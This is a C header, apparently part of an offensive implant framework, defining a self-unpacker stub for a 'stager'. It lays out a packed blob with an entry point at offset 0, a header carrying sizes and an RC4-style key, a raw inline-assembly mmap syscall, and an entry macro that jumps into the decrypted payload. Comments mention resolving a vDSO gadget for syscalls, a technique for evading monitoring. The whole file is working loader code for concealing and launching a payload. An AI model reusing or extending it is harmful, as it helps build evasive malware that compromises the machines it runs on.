#ifndef UNPACK_H
#define UNPACK_H

#include <stddef.h>
#include <stdint.h>

/*
 * Self-unpacker stub contract (pluggable, mirrors the transport interface).
 *
 * A packed stager is laid out as:
 *
 *   [stub .init: _start][stub .text][stub .data: header][packed payload]
 *
 * `_start` (extracted first, so it sits at offset 0 of the packed blob) calls
 * the stub's unpack_and_run(), which transforms the packed payload back into
 * the original stager and jumps to it.
 *
 * The header is patched at build time by the matching packer (pack_<name>.py)
 * and read by the stub at runtime:
 *   unpacked_size: payload size after unpacking.
 *   packed_size:   packed payload size (bytes after the header).
 *   key:           unpacker-specific material (e.g. RC4 key); zero if unused.
 *
 * To add an unpacker:
 *   1. Implement unpack_stub_<name>.c: define unpack_and_run() and call
 *      UNPACK_ENTRY() (see unpack_stub_rc4.c).
 *   2. Implement pack_<name>.py: transform stager.bin and patch the header
 *      (see pack_rc4.py).
 *   3. Select it with `make packed UNPACKER=<name>`.
 */

struct unpack_header {
  uint32_t unpacked_size;
  uint32_t packed_size;
  uint8_t key[16];
};

/* Minimal mmap (SYS_mmap = 9). One raw syscall per stub; the unpacked stager
 * resolves the vDSO gadget for all of its own syscalls afterwards. */
static inline long unpack_mmap(void *addr, size_t len, long prot, long flags,
                               long fd, long off) {
  long ret;
  register long r10 __asm__("r10") = flags;
  register long r8 __asm__("r8") = fd;
  register long r9 __asm__("r9") = off;
  __asm__ __volatile__("syscall"
                       : "=a"(ret)
                       : "a"(9), "D"(addr), "S"(len), "d"(prot), "r"(r10),
                         "r"(r8), "r"(r9)
                       : "rcx", "r11", "memory");
  return ret;
}

/* Emit the entry point in .init (offset 0 of the packed blob). Calls the
 * stub's unpack_and_run() and traps if it ever returns. */
#define UNPACK_ENTRY()                                                        \
  __asm__(".section .init,\"ax\",@progbits\n"                                \
          ".global _start\n"                                                 \
          "_start:\n"                                                        \
          "xor %rbp, %rbp\n"                                                 \
          "and $0xfffffffffffffff0, %rsp\n"                                  \
          "call unpack_and_run\n"                                            \
          "ud2\n")

#endif /* UNPACK_H */
